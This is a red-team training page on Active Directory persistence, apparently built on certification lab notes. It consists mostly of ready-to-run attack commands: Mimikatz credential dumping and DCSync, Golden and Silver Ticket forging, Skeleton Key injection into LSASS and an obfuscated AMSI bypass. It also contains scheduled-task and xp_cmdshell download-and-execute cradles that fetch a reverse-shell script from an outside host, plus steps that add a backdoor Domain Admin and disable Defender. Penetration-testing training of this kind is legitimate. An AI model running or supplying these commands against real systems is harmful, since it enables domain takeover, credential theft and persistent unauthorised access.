---
layout: training-page
title: "AD Persistence — Golden Ticket, Silver Ticket, Skeleton Key — Red Team Academy"
module: "Active Directory"
tags:
  - active-directory
  - golden-ticket
  - silver-ticket
  - skeleton-key
  - kerberos
  - persistence
  - mimikatz
  - forest-trusts
  - mssql
page_key: "ad-persistence"
render_with_liquid: false
---

# Active Directory Persistence

After achieving Domain Admin, persistence mechanisms allow maintaining access even if credentials are rotated. This page covers Golden Ticket, Silver Ticket, and Skeleton Key attacks using Invoke-Mimikatz, as well as forest trust ticket abuse and MSSQL lateral movement via linked servers.

## Prerequisites — Credential Harvesting

```
# Dump hashes on DC (requires DA on target)
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc

# DCSync — get krbtgt hash without touching DC memory
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

# Get ekeys (AES256 keys — stealthier than RC4)
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'

# Vault credentials
Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'

# Dump on multiple machines
Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")
```

## Golden Ticket

A Golden Ticket is a forged Kerberos TGT signed with the domain's `krbtgt` hash. It allows impersonating any user including Domain Admin, and is valid for any service in the domain. The ticket persists even after password changes unless `krbtgt` is rotated twice.

### Attack Flow

```
# Step 1: Get a PS session as DA using Over-Pass-the-Hash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:<ntlmhash> /run:powershell.exe"'

# Step 2: Connect to the DC
$sess = New-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local
Enter-PSSession -Session $sess

# Step 3: Bypass AMSI on the new session
S`eT-It`em ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( '1Q2U' + 'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"( ( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

# Step 4: Load Mimikatz via Invoke-Command then enter session
Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
Enter-PSSession -Session $sess

# Step 5: Get krbtgt hash
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
# Note: krbtgt NTLM hash and domain SID
```

### Forge the Golden Ticket

```
# On any non-DA machine — create Golden Ticket and inject into memory (/ptt)
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /krbtgt:<krbtgt-hash> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

# Verify ticket is loaded
klist

# Access any service on the DC
ls \\dcorp-dc.dollarcorp.moneycorp.local\C$
PsExec64.exe \\dcorp-dc.dollarcorp.moneycorp.local -u domain\user cmd

# Impacket (Linux) — pass-the-ticket equivalent (substitute real krbtgt NTLM hash and domain SID)
ticketer.py -nthash 8846f7eaee8fb117ad06bdd830b7586c -domain-sid S-1-5-21-1004336348-1177238915-682003330 -domain dollarcorp.moneycorp.local Administrator
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass dc01.dollarcorp.moneycorp.local
```

### Golden Ticket — Forest Privilege Escalation

```
# Get trust key and SIDs of target forest
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:DOLLARCORP.MONEYCORP.LOCAL /all /csv"'

# Forge inter-forest ticket
# /sids: is the SID of the target forest Enterprise Admins group
Invoke-Mimikatz -Command '"kerberos::golden /user:student21 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ptt"'

# Test access to cross-forest DC
gwmi -Class win32_computersystem -ComputerName mcorp-dc.moneycorp.local
```

## Silver Ticket

A Silver Ticket is a forged Kerberos Service Ticket (TGS) signed with a service account's NTLM hash. Unlike Golden Tickets, Silver Tickets never touch the DC — no TGT validation occurs. Useful for stealthy persistent access to specific services.

### Common Service Targets

```
CIFS      — File shares: \\dc\C$
HOST      — Scheduled tasks, WMI
HTTP      — WinRM, IIS
LDAP      — LDAP queries, DCSync (with LDAP Silver Ticket)
MSSQL     — SQL Server access
WSMAN     — PowerShell remoting
```

### Forge a Silver Ticket

```
# Get computer account hash (needed for CIFS/HOST Silver Ticket to DC)
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc

# Forge CIFS Silver Ticket for DC
Invoke-Mimikatz -Command '"kerberos::golden /domain:ad.domain.local /sid:<domain-sid> /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:<computer-account-rc4> /user:Administrator /ptt"'

# Access file share using the Silver Ticket
ls \\dcorp-dc.dollarcorp.moneycorp.local\C$

# Schedule and execute a task via HOST Silver Ticket
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "Persist" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://10.10.10.10:8080/Invoke-PowerShellTcp.ps1''')'"
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "Persist"

# LDAP Silver Ticket (for DCSync-like access without Replicating Directory Changes All rights)
Invoke-Mimikatz -Command '"kerberos::golden /domain:ad.domain.local /sid:<domain-sid> /target:dcorp-dc.dollarcorp.moneycorp.local /service:LDAP /rc4:<computer-rc4> /user:Administrator /ptt"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

## Skeleton Key

Skeleton Key patches the LSASS process on a DC to accept a universal password ("mimikatz") for any domain account, while the real password continues to work. This is an in-memory patch — it does not survive a reboot.

```
# Inject skeleton key into LSASS on the DC
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
# Skeleton Key password is: mimikatz

# Now authenticate as any user with password "mimikatz"
Enter-PSSession -Computername dcorp-dc.dollarcorp.moneycorp.local -credential dcorp\Administrator
# Enter "mimikatz" as the password — real password also still works
```

### Skeleton Key — LSASS Protected Process

```
# If LSASS runs as a protected process, use the mimidriv.sys driver
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```

## Over-Pass-the-Hash (Pass-the-Key)

Converts an NTLM hash or AES key into a Kerberos TGT. More stealthy than standard pass-the-hash since it generates Kerberos traffic instead of NTLM.

```
# Over-Pass-the-Hash — spawn PowerShell as target user
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:<ntlmhash> /run:powershell.exe"'

# With AES256 key (stealthier — no RC4 downgrade)
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /run:powershell.exe"'

# Verify access from the new PS window
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

## PowerShell Remoting for Lateral Movement

```
# Enter interactive session
Enter-PSSession -Computername dcorp-adminsrv.dollarcorp.moneycorp.local

# Persistent session — state maintained between commands
$sess = New-PSSession -Computername dcorp-adminsrv.dollarcorp.moneycorp.local
Invoke-Command -Session $sess -ScriptBlock {$proc = Get-Process}
Invoke-Command -Session $sess -ScriptBlock {$proc.Name}

# Execute commands on remote machine
Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock {whoami}

# Load and execute a local script on the remote machine
$sess = New-PSSession -Computername dcorp-adminsrv.dollarcorp.moneycorp.local
Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
Enter-PSSession -Session $sess
[remote]:PS> Invoke-Mimikatz

# With explicit credentials
$pass = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("CORP\john", $pass)
Enter-PSSession -computername ATSSERVER -ConfigurationName dc_manage -credential $cred

# Check language mode on remote machine
Invoke-Command -computername dc -ScriptBlock {$ExecutionContext.SessionState.LanguageMode}

# Check AppLocker policy
Invoke-Command -computername dc -ScriptBlock {Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections}

# Add user to domain admin group
Invoke-Command -ScriptBlock {net group "DOMAIN ADMINS" student21 /domain /add} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

## Forest Trust Ticket Abuse

```
# Step 1: Get trust key of inter-forest trust from DC
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

# Step 2: Forge the inter-forest TGT
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:ad.domain.local /sid:<sid> /rc4:<rc4-hash> /service:krbtgt /target:domain2.local /ticket:C:\temp\trust_forest_tkt.kirbi"'

# Step 3: Request a TGS for the target domain service
.\asktgs.exe C:\temp\trust_forest_tkt.kirbi CIFS/dc.domain2.local

# Step 4: Inject and use the TGS
.\kirbikator.exe lsa .\CIFS.dc.targetDomain.local.kirbi
ls \\dc.domain2.local\shares\

# Check ForeignSecurityPrincipals — accounts from other domains with access
Get-DomainObject -Domain targetDomain.local | ? {$_.objectclass -match "foreignSecurityPrincipal"}
Get-DomainObject | ? {$_.objectsid -match "S-1-5-21-493355955-4215530352-779396340-1104"}
```

## MSSQL Abuse via Linked Servers

SQL Server linked servers allow one SQL instance to execute queries on another. If a linked server has higher privileges (sysadmin), you can chain queries to escalate and execute commands.

```
# Step 1: Find SQL instances in domain
Import-Module .\PowerUpSQL.psd1
Get-SQLInstanceDomain

# Step 2: Check access
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose

# Step 3: Check privileges
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Step 4: Check impersonation rights
Invoke-SQLAudit -Verbose -Instance <instanceName>

# Step 5: Enumerate linked servers
Get-SQLServerLink -Instance <instanceName> -Verbose
# or via T-SQL
select * from master..sysservers

# Step 6: Crawl DB links
Get-SQLServerLinkCrawl -Instance dcorp-mysql -Verbose
# or via nested openquery
select * from openquery("<instanceName>",'select * from openquery("<linkedInstance>",''select * from master..sysservers'')')

# Step 7: Execute commands on linked server (if xp_cmdshell enabled or SysAdmin)
Get-SQLServerLinkCrawl -Instance dcorp-mysql -Query "exec master..xp_cmdshell 'whoami'" | ft

# Step 8: Download and execute payload on target server
Get-SQLServerLinkCrawl -Instance <instanceName> -Query 'exec master..xp_cmdshell "powershell -c iex (new-object net.webclient).downloadstring(''http://10.10.10.10:8080/Invoke-HelloWorld.ps1'')"'

# Impersonate login + enable xp_cmdshell via chained EXECUTE AS
Get-SQLServerLinkCrawl -Verbose -Instance <instanceName> -Query "EXECUTE AS LOGIN = 'dbuser'; EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC master..xp_cmdshell 'whoami'"
```

## Domain Admin Persistence Checklist

```
# 1. Dump all hashes and ekeys from the DC
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dc
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'

# 2. Add persistence via:
#    a. Golden Ticket (requires krbtgt hash — persists across reboots)
#    b. Skeleton Key (in-memory only — lost on reboot)
#    c. DCSync rights via ACL (see acl-abuse page)
#    d. AdminSDHolder modification (see acl-abuse page)

# 3. Add user to DA and local admins
net group "DOMAIN ADMINS" student21 /domain /add
net localgroup Administrators student21 /add
net localgroup "Remote Desktop Users" student21 /add

# 4. Disable defenses if needed
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
```

## Resources

- CRTP Notes — Altered Security — `github.com/alteredsecurity/CRTP-Notes`
- InternalAllTheThings — Kerberos — `swisskyrepo.github.io/InternalAllTheThings/active-directory/kerberos/`
- Mimikatz — `github.com/gentilkiwi/mimikatz`
- PowerUpSQL — `github.com/NetSPI/PowerUpSQL`
- Invoke-Mimikatz — `github.com/PowerShellMafia/PowerSploit`
- HarmJ0y — The Most Complete Golden Ticket Defense — `blog.harmj0y.net`
